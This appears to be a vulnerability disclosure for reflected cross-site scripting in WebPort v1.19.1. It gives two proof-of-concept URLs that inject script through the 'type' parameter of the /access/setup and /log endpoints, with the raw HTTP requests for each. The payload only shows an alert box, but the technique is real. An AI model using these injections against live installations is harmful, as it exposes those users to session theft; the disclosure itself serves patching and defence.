# WebPort-v1.19.1-Reflected-XSS
Reflected XSS in WebPort-v1.19.1 impacts users who open a maliciously crafted link or third-party web page.

# CVE-2019-XXXX
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-XXXX

# PoC-1
To exploit vulnerability, someone could use **'http://[server]:8090/access/setup?type="</script><script>alert('xss');</script><script>'** request to impact users who open a maliciously crafted link or third-party web page.

```
GET /access/setup?type=%22%3C/script%3E%3Cscript%3Ealert(%27xss%27);%3C/script%3E%3Cscript%3E HTTP/1.1
Host: 172.16.165.182:8090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: __tiny_sessid=6361847c-952b-45ba-874c-71f1794ffe37
Upgrade-Insecure-Requests: 1
```

![alt tag](https://emreovunc.com/blog/en/WebPort-Reflected-XSS-01.png)

# PoC-2
To exploit vulnerability, someone could use **'http://[server]:8090/log?type="</script><script>alert('xss');</script><script>'** request to impact users who open a maliciously crafted link or third-party web page.
  
```
GET /log?type=%22%3C/script%3E%3Cscript%3Ealert(%27xss%27);%3C/script%3E%3Cscript%3E HTTP/1.1
Host: 172.16.165.182:8090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: __tiny_sessid=6361847c-952b-45ba-874c-71f1794ffe37
Upgrade-Insecure-Requests: 1
```

![alt tag](https://emreovunc.com/blog/en/WebPort-Reflected-XSS-02.png)
